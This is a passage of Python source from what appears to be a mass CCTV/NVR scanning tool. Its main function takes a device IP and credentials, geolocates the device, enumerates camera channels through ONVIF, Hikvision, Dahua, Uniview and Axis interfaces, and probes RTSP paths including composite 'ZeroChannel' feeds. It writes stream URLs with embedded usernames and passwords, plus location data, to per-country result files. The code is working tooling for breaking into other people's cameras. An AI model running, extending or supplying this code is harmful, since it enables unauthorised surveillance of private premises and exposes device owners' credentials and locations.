        files_sorted = sorted(files, key=lambda p: os.path.getmtime(p), reverse=True)
        keeper  = files_sorted[0]
        victims = files_sorted[1:]
        rel_folder = os.path.relpath(folder, SCRIPT_DIR)
        print(f"  {C}{canonical}{ext}{W}  ({len(files)} copies in {rel_folder}/)")
        print(f"    {G}keep  → {os.path.basename(keeper)}{W}")
        for v in victims:
            print(f"    {R}delete→ {os.path.basename(v)}{W}")
            to_delete.append(v)
        # If keeper still has a timestamp suffix, schedule rename
        k_stem, k_ext = os.path.splitext(os.path.basename(keeper))
        clean_keeper = _TS_SUFFIX.sub('', k_stem) + k_ext
        if clean_keeper != os.path.basename(keeper):
            new_path = os.path.join(folder, clean_keeper)
            print(f"    {Y}rename→ {os.path.basename(keeper)}  →  {clean_keeper}{W}")
            to_rename.append((keeper, new_path))
        print()

    # ── Lone timestamped files: just rename, nothing to delete ───────────────────────
    if lone_ts_groups:
        print(f"  {Y}Lone files with timestamp suffix (will be renamed):{W}")
        for (folder, canonical, ext), fp in sorted(lone_ts_groups.items()):
            stem, fext = os.path.splitext(os.path.basename(fp))
            clean_name = _TS_SUFFIX.sub('', stem) + fext
            new_path   = os.path.join(folder, clean_name)
            rel_folder = os.path.relpath(folder, SCRIPT_DIR)
            print(f"    {C}{os.path.basename(fp)}{W}  →  {clean_name}  ({rel_folder}/)")
            to_rename.append((fp, new_path))
        print()

    summary = []
    if to_delete:
        summary.append(f"delete {len(to_delete)} redundant file(s)")
    if to_rename:
        summary.append(f"rename {len(to_rename)} file(s) to remove timestamps")

    try:
        confirm = input(f"{G}Proceed: {', '.join(summary)}? (y/n): {W}").strip().lower()
    except (EOFError, KeyboardInterrupt):
        print(f"\n{Y}[*] Cancelled.{W}")
        return
    if confirm != 'y':
        print(f"{Y}[*] Cancelled — no changes made.{W}")
        return

    deleted = 0
    for fp in to_delete:
        try:
            os.remove(fp)
            print(f"  {R}[✗] Deleted : {os.path.basename(fp)}{W}")
            deleted += 1
        except Exception as e:
            print(f"  {R}[!] Could not delete {os.path.basename(fp)}: {e}{W}")

    renamed = 0
    for old_path, new_path in to_rename:
        try:
            if not os.path.exists(old_path):
                continue   # already removed as a duplicate victim above
            if os.path.exists(new_path):
                # Clean name already exists — keep whichever is newer
                if os.path.getmtime(old_path) >= os.path.getmtime(new_path):
                    os.remove(new_path)
                else:
                    os.remove(old_path)
                    print(f"  {Y}[~] Kept existing (newer): {os.path.basename(new_path)}{W}")
                    continue
            os.rename(old_path, new_path)
            print(f"  {G}[✓] Renamed: {os.path.basename(old_path)}  →  {os.path.basename(new_path)}{W}")
            renamed += 1
        except Exception as e:
            print(f"  {R}[!] Could not rename {os.path.basename(old_path)}: {e}{W}")

    print(f"\n{C}{'═'*64}{W}")
    print(f"{G}  Done: {deleted} deleted, {renamed} renamed.{W}")
    print(f"{C}{'═'*64}{W}\n")


def sort_rtsp_files_to_folders():
    """
    Move scattered NVR_*.{txt,json,m3u} and <CC>_RTSP_Found.txt files
    from the script root into RTSP_Results/<CC>/ country sub-folders.
    Country code is inferred from the filename prefix (first 2 uppercase letters).
    """
    import re as _re_srt
    C, G, Y, W, R = Fore.CYAN, Fore.GREEN, Fore.YELLOW, Style.RESET_ALL, Fore.RED

    _results_root = os.path.join(SCRIPT_DIR, 'RTSP_Results')
    try:
        os.makedirs(_results_root, exist_ok=True)
    except Exception:
        pass

    # Patterns that are NEVER RTSP channel map files — always exclude these
    _EXCLUDE_PATTERNS = (
        '_IP.txt', 'CCTV_Found', 'ValidCamera', 'Valid_Logins',
        'scan_progress', 'rtsp_stats', 'rtsp_scan_progress',
        'telegram_config', 'credentials', 'cred_stats',
    )
    # An RTSP geo-tagged file must contain an IP address (4 groups of digits
    # separated by underscores) somewhere in the stem, e.g. MY_Johor_180_74_232_100_80
    _IP_IN_NAME = _re_srt.compile(r'_\d{1,3}_\d{1,3}_\d{1,3}_\d{1,3}_')

    candidates = []
    try:
        for fname in sorted(os.listdir(SCRIPT_DIR)):
            fpath = os.path.join(SCRIPT_DIR, fname)
            if not os.path.isfile(fpath):
                continue
            if not any(fname.endswith(ext) for ext in ('.txt', '.json', '.m3u')):
                continue
            # Never move known non-RTSP files
            if any(p in fname for p in _EXCLUDE_PATTERNS):
                continue
            m = _re_srt.match(r'^([A-Z]{2})_', fname)
            if m and (_IP_IN_NAME.search(fname) or '_RTSP_Found' in fname):
                # Geo-tagged RTSP file: CC_Region_IP_Port[_ts].ext
                candidates.append((fpath, fname, m.group(1)))
            elif _re_srt.match(r'^NVR_', fname) and _IP_IN_NAME.search(fname):
                # NVR file: NVR_IP_Port[_ts].ext
                candidates.append((fpath, fname, None))
    except Exception as e:
        print(f"{R}[!] Error scanning folder: {e}{W}")
        return

    if not candidates:
        print(f"\n{Y}[*] No scattered RTSP/NVR files found in the root folder to sort.{W}")
        return

    print(f"\n{C}{'═'*62}{W}")
    print(f"{G}  File Sorter — Move RTSP/NVR files to country folders{W}")
    print(f"{C}{'═'*62}{W}")
    print(f"  {len(candidates)} file(s) detected:\n")

    for _, fname, cc in candidates[:30]:
        dest_cc = cc if cc else '??'
        print(f"  {Y}{fname:<50}{W}  →  RTSP_Results/{dest_cc}/")
    if len(candidates) > 30:
        print(f"  ... and {len(candidates) - 30} more")
    print()

    try:
        confirm = input(f"{G}Move all these files into country sub-folders? (y/n): {W}").strip().lower()
    except (EOFError, KeyboardInterrupt):
        return
    if confirm != 'y':
        print(f"{Y}[*] Cancelled.{W}")
        return

    moved = 0
    skipped = 0
    _TS_PAT = _re_srt.compile(r'_\d{8}_\d{6}$')   # _YYYYMMDD_HHMMSS at end of stem
    for fpath, fname, cc in candidates:
        dest_dir = os.path.join(_results_root, cc if cc else 'NVR_Misc')
        try:
            os.makedirs(dest_dir, exist_ok=True)
        except Exception:
            dest_dir = _results_root
        # Strip timestamp from destination filename
        stem, ext = os.path.splitext(fname)
        clean_stem = _TS_PAT.sub('', stem)
        clean_fname = clean_stem + ext
        dest = os.path.join(dest_dir, clean_fname)
        try:
            if os.path.exists(dest):
                # Keep whichever is newer; remove the older one
                existing_mtime = os.path.getmtime(dest)
                incoming_mtime = os.path.getmtime(fpath)
                if incoming_mtime >= existing_mtime:
                    os.remove(dest)           # replace with newer incoming
                else:
                    os.remove(fpath)          # existing is already newer — drop incoming
                    cc_label = cc if cc else 'NVR_Misc'
                    print(f"  {Y}[~]{W} {fname}  →  kept existing (newer) {clean_fname}")
                    skipped += 1
                    continue
            os.rename(fpath, dest)
            cc_label = cc if cc else 'NVR_Misc'
            arrow = f"{fname}  →  RTSP_Results/{cc_label}/{clean_fname}" if fname != clean_fname else f"{fname}  →  RTSP_Results/{cc_label}/"
            print(f"  {G}[✓]{W} {arrow}")
            moved += 1
        except Exception as e:
            print(f"  {R}[!] Could not move {fname}: {e}{W}")
            skipped += 1

    print(f"\n{C}{'═'*62}{W}")
    print(f"{G}  Done: {moved} moved, {skipped} skipped.{W}")
    print(f"{C}{'═'*62}{W}")


def run_nvr_split(nvr_ip, nvr_port, nvr_user, nvr_pass, silent=False,
                  output_dir=None, fname_prefix=None):
    """
    Enumerate all channels on an NVR/DVR with default settings (no prompts).
    Fetches geolocation, tries ONVIF/Hikvision/Dahua/Uniview/Axis/Generic detection,
    exports TXT+JSON+M3U with location info, sends Telegram alert.
    output_dir: folder where files are saved (defaults to SCRIPT_DIR)
    fname_prefix: override filename base (e.g. 'AE_Dubai_94.200.120.46_80')
    Returns (channel_count, fname_base) or (0, None) on failure.
    """
    import re as _re_s
    import html as _html_s
    import datetime as _dt_s

    C  = Fore.CYAN
    G  = Fore.GREEN
    Y  = Fore.YELLOW
    W  = Style.RESET_ALL
    R  = Fore.RED

    _max_ch    = 128
    _timeout   = 2.0
    _test_rtsp = True

    # ── Geolocation ──────────────────────────────────────────────────────────
    _geo     = get_geographic_location(nvr_ip)
    _geo_str = (f"{_geo.get('city','Unknown')}, "
                f"{_geo.get('region','Unknown')}, "
                f"{_geo.get('country','Unknown')}")

    if not silent:
        print(f"\n{C}  Probing {nvr_ip}:{nvr_port} ...{W}")
        print(f"  {Y}Location : {_geo_str}{W}")

    _channels = []

    # ── TCP pre-check ─────────────────────────────────────────────────────────
    _tcp_ok_http = _tcp_ok_554 = False
    for _pc in ([80, nvr_port, 554] if nvr_port not in (80, 554) else [80, 554]):
        try:
            _ts = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            _ts.settimeout(0.5)
            _ts.connect((nvr_ip, _pc))
            _ts.close()
            if _pc == 554:
                _tcp_ok_554 = True
            else:
                _tcp_ok_http = True
        except Exception:
            pass

    if not _tcp_ok_http and not _tcp_ok_554:
        if not silent:
            print(f"  {R}[!] {nvr_ip} unreachable (ports {nvr_port} & 554 closed).{W}")
        return 0, None

    def _soap(endpoint, body, _t=3.0):
        for _retry in range(2):
            try:
                _rr = requests.post(
                    f"http://{nvr_ip}:{nvr_port}{endpoint}",
                    data=body,
                    headers={'Content-Type': 'application/soap+xml;charset=UTF-8'},
                    auth=HTTPDigestAuth(nvr_user, nvr_pass),
                    timeout=min(_t * (0.5 if _retry else 1.0), 4.0),
                    verify=False)
                return _rr.status_code, _rr.text
            except Exception:
                if _retry == 1:
                    return 0, ''
                import time as _tsleep; _tsleep.sleep(0.1)

    # ── ONVIF GetProfiles + GetStreamUri ─────────────────────────────────────
    _PROFILES = (
        '<?xml version="1.0" encoding="utf-8"?>'
        '<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope">'
        '<s:Body><trt:GetProfiles '
        'xmlns:trt="http://www.onvif.org/ver10/media/wsdl"/>'
        '</s:Body></s:Envelope>')
    for _ep in ['/onvif/device_service', '/onvif/media', '/onvif/media_service', '/onvif']:
        _sc, _body = _soap(_ep, _PROFILES)
        if _sc == 200 and 'token' in _body:
            _tokens = _re_s.findall(r'token="([^"]+)"', _body)
            _names  = _re_s.findall(r'<[^>]*Name[^>]*>([^<]+)<', _body)
            if not silent:
                print(f"  {G}[ONVIF] {len(_tokens)} profile(s) via {_ep}{W}")
            _media_ep = _ep.replace('device_service', 'media').replace('device', 'media')
            for _i, _tok in enumerate(_tokens[:_max_ch]):
                _chname = _names[_i] if _i < len(_names) else f"Ch{_i+1}"
                _STREAM_URI = (
                    '<?xml version="1.0" encoding="utf-8"?>'
                    '<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope">'
                    '<s:Body><trt:GetStreamUri '
                    'xmlns:trt="http://www.onvif.org/ver10/media/wsdl">'
                    '<trt:StreamSetup>'
                    '<tt:Stream xmlns:tt="http://www.onvif.org/ver10/schema">RTP-Unicast</tt:Stream>'
                    '<tt:Transport xmlns:tt="http://www.onvif.org/ver10/schema">'
                    '<tt:Protocol>RTSP</tt:Protocol>'
                    '</tt:Transport></trt:StreamSetup>'
                    f'<trt:ProfileToken>{_tok}</trt:ProfileToken>'
                    '</trt:GetStreamUri></s:Body></s:Envelope>')
                _sc2, _b2 = _soap(_media_ep, _STREAM_URI)
                _rtsp = ''
                if _sc2 == 200:
                    _m = _re_s.search(r'<[^>]*Uri[^>]*>(rtsp://[^<]+)<', _b2)
                    if _m:
                        _rtsp = _html_s.unescape(_m.group(1).strip())
                if _rtsp and '@' not in _rtsp:
                    _rtsp = _rtsp.replace('rtsp://', f'rtsp://{nvr_user}:{nvr_pass}@')
                _channels.append({
                    'num':      _i + 1,
                    'name':     _chname,
                    'rtsp':     _rtsp or f"rtsp://{nvr_user}:{nvr_pass}@{nvr_ip}:554/Streaming/Channels/{(_i+1)*100+1}",
                    'snapshot': f"http://{nvr_ip}:{nvr_port}/onvif/snapshot?token={_tok}",
                    'source':   'ONVIF',
                })
            break

    # ── Hikvision ISAPI ───────────────────────────────────────────────────────
    if not _channels:
        for _hpath in ['/ISAPI/ContentMgmt/InputProxy/channels',
                       '/ISAPI/Streaming/channels']:
            try:
                _r = requests.get(
                    f"http://{nvr_ip}:{nvr_port}{_hpath}",
                    auth=HTTPDigestAuth(nvr_user, nvr_pass),
                    timeout=5, verify=False)
                if _r.status_code == 200 and 'channel' in _r.text.lower():
                    _ids = _re_s.findall(r'<id>(\d+)</id>', _r.text)
                    _nms = _re_s.findall(r'<channelName>([^<]*)</channelName>', _r.text)
                    if not _ids:
                        _ids = _re_s.findall(r'<channelNo>(\d+)</channelNo>', _r.text)
                    if not silent:
                        print(f"  {G}[Hikvision ISAPI] {len(_ids)} channel(s){W}")
                    for _ci, _cid in enumerate(_ids[:_max_ch]):
                        _cn = (_nms[_ci] if _ci < len(_nms) else f"Ch{_cid}") or f"Ch{_cid}"
                        _channels.append({
                            'num':      int(_cid),
                            'name':     _cn,
                            'rtsp':     f"rtsp://{nvr_user}:{nvr_pass}@{nvr_ip}:554/Streaming/Channels/{_cid}01",
                            'snapshot': f"http://{nvr_ip}:{nvr_port}/ISAPI/Streaming/channels/{_cid}01/picture",
                            'source':   'Hikvision',
                        })
                    break
            except Exception:
                continue

    # ── Dahua CGI ─────────────────────────────────────────────────────────────
    if not _channels and _tcp_ok_http:
        try:
            _r = requests.get(
                f"http://{nvr_ip}:{nvr_port}/cgi-bin/magicBox.cgi?action=getSystemInfo",
                auth=HTTPDigestAuth(nvr_user, nvr_pass),
                timeout=3.0, verify=False)
            if _r.status_code == 200:
                _m = _re_s.search(r'channelNum=(\d+)', _r.text)
                _n_ch = min(int(_m.group(1)) if _m else 4, _max_ch)
                if not silent:
                    print(f"  {G}[Dahua CGI] {_n_ch} channel(s){W}")
                for _ci in range(1, _n_ch + 1):
                    _channels.append({
                        'num':      _ci,
                        'name':     f"Channel {_ci}",
                        'rtsp':     f"rtsp://{nvr_user}:{nvr_pass}@{nvr_ip}:554/cam/realmonitor?channel={_ci}&subtype=0",
                        'snapshot': f"http://{nvr_ip}:{nvr_port}/cgi-bin/snapshot.cgi?channel={_ci}",
                        'source':   'Dahua',
                    })
        except Exception:
            pass

    # ── Uniview SOAP ──────────────────────────────────────────────────────────
    if not _channels and _tcp_ok_http:
        try:
            _uv = (
                '<?xml version="1.0" encoding="utf-8"?>'
                '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'
                '<soap:Body><c:GetDeviceInfo xmlns:c="http://www.uniview.com/2014/07">'
                '</c:GetDeviceInfo></soap:Body></soap:Envelope>')
            _sc, _body = _soap('/webapi/system/SysInfoService?wsdl', _uv)
            if _sc == 200 and 'ChannelNum' in _body:
                _m = _re_s.search(r'<ChannelNum>(\d+)</ChannelNum>', _body)
                _n_ch = min(int(_m.group(1)) if _m else 4, _max_ch)
                if not silent:
                    print(f"  {G}[Uniview SOAP] {_n_ch} channel(s){W}")
                for _ci in range(1, _n_ch + 1):
                    _channels.append({
                        'num':      _ci,
                        'name':     f"Channel {_ci}",
                        'rtsp':     f"rtsp://{nvr_user}:{nvr_pass}@{nvr_ip}:554/media/video{_ci}",
                        'snapshot': f"http://{nvr_ip}:{nvr_port}/webapi/snap?channel={_ci}",
                        'source':   'Uniview',
                    })
        except Exception:
            pass

    # ── Axis HTTP API ─────────────────────────────────────────────────────────
    if not _channels and _tcp_ok_http:
        try:
            _r = requests.get(
                f"http://{nvr_ip}:{nvr_port}/axis-cgi/streams/list.json",
                auth=HTTPBasicAuth(nvr_user, nvr_pass),
                timeout=3.0, verify=False)
            if _r.status_code == 200:
                _j = _r.json()
                if 'apiVersion' in _j:
                    _streams = _j.get('payloads', [])
                    if not silent:
                        print(f"  {G}[Axis HTTP] {len(_streams)} stream(s){W}")
                    for _i, _s in enumerate(_streams[:_max_ch]):
                        _uri = _s.get('uri', f'stream{_i+1}')
                        _channels.append({
                            'num':      _i + 1,
                            'name':     _uri.split('/')[-1],
                            'rtsp':     f"rtsp://{nvr_user}:{nvr_pass}@{nvr_ip}:554{_uri}",
                            'snapshot': f"http://{nvr_ip}:{nvr_port}/axis-cgi/jpg/image.cgi?resolution=640x480",
                            'source':   'Axis',
                        })
        except Exception:
            pass

    # ── Generic RTSP DESCRIBE probe ───────────────────────────────────────────
    if not _channels and _tcp_ok_554:
        if not silent:
            print(f"  {Y}[Generic] Probing channels 1-32 via RTSP DESCRIBE...{W}")
        _g_tpls = [
            '/Streaming/Channels/{n}01',
            '/h264/ch{n}/main/av_stream',
            '/cam/realmonitor?channel={n}&subtype=0',
            '/ch{n}', '/stream{n}', '/onvif/profile{n}',
            '/media/video{n}', '/Streaming/Channels/Channel{n}',
        ]
        for _gn in range(1, 33):
            _found_ch = False
            for _gt in _g_tpls:
                if _found_ch:
                    break
                _gpath = _gt.replace('{n}', str(_gn))
                _gurl  = f"rtsp://{nvr_user}:{nvr_pass}@{nvr_ip}:554{_gpath}"
                _greq  = (f"DESCRIBE {_gurl} RTSP/1.0\r\nCSeq: 1\r\n"
                          f"User-Agent: W8Scanner\r\n\r\n")
                for _retry in range(2):
                    try:
                        _gs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        _gs.settimeout(_timeout if not _retry else _timeout * 0.7)
                        _gs.connect((nvr_ip, 554))
                        _gs.sendall(_greq.encode())
                        _gresp = _gs.recv(128).decode('utf-8', errors='replace')
                        _gs.close()
                        if ' 200 ' in _gresp:
                            _channels.append({
                                'num':      _gn,
                                'name':     f"Channel {_gn}",
                                'rtsp':     _gurl,
                                'snapshot': f"http://{nvr_ip}:{nvr_port}/snapshot_ch{_gn}.jpg",
                                'source':   'Generic',
                            })
                            if not silent:
                                print(f"    {G}[✓] Ch{_gn}: {_gpath}{W}")
                            _found_ch = True
                            break
                    except socket.timeout:
                        if _retry == 1:
                            break
                        import time as _tgs; _tgs.sleep(0.05)
                    except Exception:
                        break
            if len(_channels) >= _max_ch:
                break

    # ── ZeroChannel / Composite-stream probe (all brands) ────────────────────
    # Many NVR/DVR systems expose a special "channel 0" that streams ALL cameras
    # as a single composite grid feed in one RTSP URL.  We probe every known
    # pattern, prioritising the brand already detected, then falling back through
    # the rest.  First hit wins; result is prepended as num=0.
    # _real_source: source of first detected channel (all entries are real here —
    # ZeroChannel hasn't been inserted yet).
    _real_source = _channels[0]['source'] if _channels else 'Generic'
    #
    # Format per entry: (rtsp_path, label, snapshot_path)
    _ZC_TABLE = {
        # ── Hikvision ──────────────────────────────────────────────────────
        # /Streaming/Channels/001  →  channel 0, subtype 1 (ZeroChannel composite)
        'Hikvision': [
            ('/Streaming/Channels/001',
             'Hikvision ZeroChannel',
             '/ISAPI/Streaming/channels/001/picture'),
            ('/h264/ch0/main/av_stream',
             'Hikvision ZeroChannel (alt)',
             '/ISAPI/Streaming/channels/001/picture'),
            ('/Streaming/channels/0',
             'Hikvision ZeroChannel (v2)',
             '/ISAPI/Streaming/channels/001/picture'),
            ('/ISAPI/Streaming/channels/001',
             'Hikvision ISAPI ZeroChannel',
             '/ISAPI/Streaming/channels/001/picture'),
        ],
        # ── Dahua / Anjhua ─────────────────────────────────────────────────
        # channel=0  →  composite view of all cameras on the NVR
        'Dahua': [
            ('/cam/realmonitor?channel=0&subtype=0',
             'Dahua ZeroChannel (main)',
             '/cgi-bin/snapshot.cgi?channel=0'),
            ('/cam/realmonitor?channel=0&subtype=1',
             'Dahua ZeroChannel (sub)',
             '/cgi-bin/snapshot.cgi?channel=0'),
            ('/cam/playback?channel=0&subtype=0',
             'Dahua ZeroChannel (playback fallback)',
             '/cgi-bin/snapshot.cgi?channel=0'),
        ],
        # ── Uniview (UNV) ──────────────────────────────────────────────────
        # video0  →  composite channel on Uniview NVRs
        # Also try Hikvision-compatible ISAPI which some Uniview firmware exposes
        'Uniview': [
            ('/media/video0',
             'Uniview ZeroChannel',
             '/webapi/snap?channel=0'),
            ('/unicorn/video0',
             'Uniview ZeroChannel (alt)',
             '/webapi/snap?channel=0'),
            ('/Streaming/Channels/001',
             'Uniview ZeroChannel (ISAPI-compat)',
             '/ISAPI/Streaming/channels/001/picture'),
            ('/media/video0/main',
             'Uniview ZeroChannel (main stream)',
             '/webapi/snap?channel=0'),
        ],
        # ── Axis ───────────────────────────────────────────────────────────
        # Axis encoders with multiple inputs expose camera=0 or camera=quad
        'Axis': [
            ('/axis-media/media.amp?videocodec=h264&camera=0',
             'Axis Composite (camera=0)',
             '/axis-cgi/jpg/image.cgi?resolution=640x480&camera=0'),
            ('/axis-media/media.amp?videocodec=h264&camera=quad',
             'Axis Quad View',
             '/axis-cgi/jpg/image.cgi?resolution=640x480&camera=quad'),
            ('/mpeg4/media.amp',
             'Axis MPEG4 Composite',
             '/axis-cgi/jpg/image.cgi?resolution=640x480'),
            ('/axis-media/media.amp',
             'Axis Media Composite',
             '/axis-cgi/jpg/image.cgi?resolution=640x480'),
        ],
        # ── ONVIF (brand unknown / multi-vendor) ───────────────────────────
        # ONVIF does not standardise a composite stream, but many ONVIF NVRs
        # are Hikvision or Dahua underneath, so try both families.
        'ONVIF': [
            ('/Streaming/Channels/001',
             'ONVIF/Hikvision ZeroChannel',
             '/ISAPI/Streaming/channels/001/picture'),
            ('/h264/ch0/main/av_stream',
             'ONVIF/Hikvision ZeroChannel (alt)',
             '/ISAPI/Streaming/channels/001/picture'),
            ('/cam/realmonitor?channel=0&subtype=0',
             'ONVIF/Dahua ZeroChannel',
             '/cgi-bin/snapshot.cgi?channel=0'),
            ('/media/video0',
             'ONVIF/Uniview ZeroChannel',
             '/webapi/snap?channel=0'),
        ],
        # ── Generic / Unknown ──────────────────────────────────────────────
        # Exhaustive list covering XMEye, Amcrest, Reolink-NVR, Foscam NVR,
        # Provision-ISR, TVT, and other OEM chipsets.
        'Generic': [
            ('/Streaming/Channels/001',
             'ZeroChannel (Hikvision-compat)',
             '/ISAPI/Streaming/channels/001/picture'),
            ('/h264/ch0/main/av_stream',
             'ZeroChannel (Hikvision alt)',
             '/ISAPI/Streaming/channels/001/picture'),
            ('/cam/realmonitor?channel=0&subtype=0',
             'ZeroChannel (Dahua-compat)',
             '/cgi-bin/snapshot.cgi?channel=0'),
            ('/media/video0',
             'ZeroChannel (Uniview-compat)',
             '/webapi/snap?channel=0'),
            ('/ch0',
             'ZeroChannel (Generic /ch0)',
             '/snapshot_ch0.jpg'),
            ('/ch0/stream0',
             'ZeroChannel (Generic /ch0/stream0)',
             '/snapshot_ch0.jpg'),
            ('/stream0',
             'ZeroChannel (Generic /stream0)',
             '/snapshot_ch0.jpg'),
            ('/live/ch0',
             'ZeroChannel (Generic /live/ch0)',
             '/snapshot_ch0.jpg'),
            ('/0/0/0',
             'ZeroChannel (XMEye style)',
             '/snapshot_ch0.jpg'),
            ('/user=&password=&channel=0&stream=0.sdp',
             'ZeroChannel (XMEye /stream.sdp)',
             '/snapshot_ch0.jpg'),
            ('/onvif/profile0',
             'ZeroChannel (ONVIF profile0)',
             '/snapshot_ch0.jpg'),
        ],
    }

    if _tcp_ok_554:
        # Build probe list: detected brand first, then all remaining brands
        _src_key = (_real_source if _channels else 'Generic')
        _seen_paths = set()
        _zc_probes  = []

        def _add_brand_probes(brand):
            for _path, _lbl, _snap in _ZC_TABLE.get(brand, []):
                if _path not in _seen_paths:
                    _seen_paths.add(_path)
                    _zc_probes.append((
                        f"rtsp://{nvr_user}:{nvr_pass}@{nvr_ip}:554{_path}",
                        _lbl,
                        f"http://{nvr_ip}:{nvr_port}{_snap}",
                    ))

        # Priority: detected brand → ONVIF (if not already) → Generic → rest
        _add_brand_probes(_src_key)
        for _fb in ['Hikvision', 'Dahua', 'Uniview', 'Axis', 'ONVIF', 'Generic']:
            if _fb != _src_key:
                _add_brand_probes(_fb)

        for _zurl, _zlabel, _zsnap in _zc_probes:
            try:
                _zs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                _zs.settimeout(1.0)
                _zs.connect((nvr_ip, 554))
                _zs.sendall((f"DESCRIBE {_zurl} RTSP/1.0\r\nCSeq: 1\r\n"
                             f"User-Agent: W8Scanner\r\n\r\n").encode())
                _zresp = _zs.recv(256).decode('utf-8', errors='replace')
                _zs.close()
                if ' 200 ' in _zresp or ' 401 ' in _zresp:
                    _channels.insert(0, {
                        'num':      0,
                        'name':     'ZeroChannel — All Cameras Combined',
                        'rtsp':     _zurl,
                        'snapshot': _zsnap,
                        'source':   _zlabel,
                        'zero_ch':  True,
                    })
                    if not silent:
                        print(f"  {G}[✓] ZeroChannel found ({_zlabel}){W}")
                        print(f"      {G}→ {_zurl}{W}")
                    break
            except Exception:
                pass

    if not _channels:
        if not silent:
            print(f"\n  {R}[✗] Could not enumerate channels on {nvr_ip}:{nvr_port}{W}")
        return 0, None

    # Helper: source from first real (non-ZeroChannel) entry
    _real_source = next((c['source'] for c in _channels if not c.get('zero_ch')),
                        _channels[0]['source'])

    # ── Verify credentials via first non-ZeroChannel RTSP DESCRIBE ───────────────
    if _test_rtsp:
        try:
            _vs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            _vs.settimeout(1.5)
            _vs.connect((nvr_ip, 554))
            _verify_rtsp = next((c['rtsp'] for c in _channels if not c.get('zero_ch')),
                                _channels[0]['rtsp'])
            _vreq = (f"DESCRIBE {_verify_rtsp} RTSP/1.0\r\nCSeq: 1\r\n"
                     f"User-Agent: W8Scanner\r\n\r\n")
            _vs.sendall(_vreq.encode())
            _vresp = _vs.recv(256).decode('utf-8', errors='replace')
            _vs.close()
            if not silent:
                if ' 200 ' in _vresp or ' 401 ' in _vresp:
                    print(f"  {G}[✓] Credentials verified (RTSP reachable){W}")
                else:
                    print(f"  {Y}[!] RTSP connection OK but authentication unclear{W}")
        except Exception as _ve:
            if not silent:
                print(f"  {R}[!] Could not verify: {_ve}{W}")

    # ── Live-test all channels and store result in _ch['live'] ───────────────
    # Skip entirely if port 554 is already known to be closed — avoids
    # stalling for (n_channels × 1.5 s) when RTSP is unreachable.
    _tested_ok = 0
    if _test_rtsp and not _tcp_ok_554:
        if not silent:
            print(f"  {Y}[!] Port 554 closed — skipping per-channel RTSP live-test.{W}")
        for _ch in _channels:
            _ch['live'] = '?'
    else:
        for _ch in _channels:
            _ch['live'] = '?'
            if _test_rtsp:
                try:
                    _cts = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    _cts.settimeout(1.5)
                    _cts.connect((nvr_ip, 554))
                    _cts.sendall((f"DESCRIBE {_ch['rtsp']} RTSP/1.0\r\nCSeq: 1\r\n"
                                  f"User-Agent: W8\r\n\r\n").encode())
                    _cr = _cts.recv(256).decode('utf-8', errors='replace')
                    _cts.close()
                    if ' 200 ' in _cr:
                        _ch['live'] = 'LIVE'; _tested_ok += 1
                    elif ' 401 ' in _cr:
                        _ch['live'] = 'AUTH'
                    else:
                        _ch['live'] = 'FAIL'
                except Exception:
                    _ch['live'] = 'FAIL'

    # ── Display channel map ───────────────────────────────────────────────────
    _LIVE_SYM = {
        'LIVE': f"{G}  [✓ LIVE]{W}",
        'AUTH': f"{Y}  [? AUTH]{W}",
        'FAIL': f"{R}  [✗ FAIL]{W}",
        '?':    '',
    }
    if not silent:
        _real_ch_count = sum(1 for c in _channels if not c.get('zero_ch'))
        _zc_entry      = next((c for c in _channels if c.get('zero_ch')), None)
        print(f"\n{C}{'═'*70}{W}")
        print(f"{G}  NVR Channel Map  —  {nvr_ip}:{nvr_port}  "
              f"({_real_ch_count} channel(s) via {_real_source}"
              f"{' + ZeroChannel' if _zc_entry else ''}){W}")
        print(f"  {Y}Username : {nvr_user}  │  Password : {nvr_pass}{W}")
        print(f"  {Y}Location : {_geo_str}{W}")
        print(f"  {Y}Country  : {_geo.get('country','Unknown')}  |  "
              f"Region: {_geo.get('region','Unknown')}  |  "
              f"City: {_geo.get('city','Unknown')}{W}")
        if _zc_entry:
            _zst = _LIVE_SYM.get(_zc_entry.get('live', '?'), '')
            print(f"{C}{'─'*70}{W}")
            print(f"  {G}★ ZeroChannel (All Cameras Combined){_zst}{W}")
            print(f"    {G}RTSP     : {_zc_entry['rtsp']}{W}")
            print(f"    {C}Snapshot : {_zc_entry['snapshot']}{W}")
        print(f"{C}{'─'*70}{W}")
        for _ch in sorted(_channels, key=lambda x: x['num']):
            if _ch.get('zero_ch'):
                continue   # already shown above
            _st = _LIVE_SYM.get(_ch.get('live', '?'), '')
            print(f"\n  {Y}Channel {_ch['num']:>2}  {_ch['name']}{_st}{W}")
            print(f"    {G}RTSP     : {_ch['rtsp']}{W}")
            print(f"    {C}Snapshot : {_ch['snapshot']}{W}")

    _nvr_ts    = _dt_s.datetime.now().strftime('%Y%m%d_%H%M%S')
    _save_dir  = output_dir if output_dir else SCRIPT_DIR
    try:
        os.makedirs(_save_dir, exist_ok=True)
    except Exception:
        _save_dir = SCRIPT_DIR
    # No timestamp in filename — same device always overwrites its own file,
    # preventing duplicate files with different names but identical content.
    # The scan timestamp is still written inside the file content (Date field).
    if fname_prefix:
        _fname_base = fname_prefix
    else:
        _fname_base = f"NVR_{nvr_ip.replace('.','_')}_{nvr_port}"

    # ── Export TEXT ───────────────────────────────────────────────────────────
    try:
        with open(os.path.join(_save_dir, f"{_fname_base}.txt"), 'w', encoding='utf-8') as _tf:
            _tf.write(f"NVR Channel Map\n")
            _tf.write(f"{'─'*70}\n")
            _tf.write(f"IP:Port    : {nvr_ip}:{nvr_port}\n")
            _tf.write(f"Username   : {nvr_user}\n")
            _tf.write(f"Password   : {nvr_pass}\n")
            _tf.write(f"Date       : {_nvr_ts}\n")
            _tf.write(f"{'─'*70}\n")
            _tf.write(f"Location   : {_geo_str}\n")
            _tf.write(f"Country    : {_geo.get('country','Unknown')}\n")
            _tf.write(f"Region     : {_geo.get('region','Unknown')}\n")
            _tf.write(f"City       : {_geo.get('city','Unknown')}\n")
            _tf.write(f"Postal     : {_geo.get('postal_code','Unknown')}\n")
            _tf.write(f"{'─'*70}\n")
            _real_ch_count_txt = sum(1 for c in _channels if not c.get('zero_ch'))
            _zc_txt = next((c for c in _channels if c.get('zero_ch')), None)
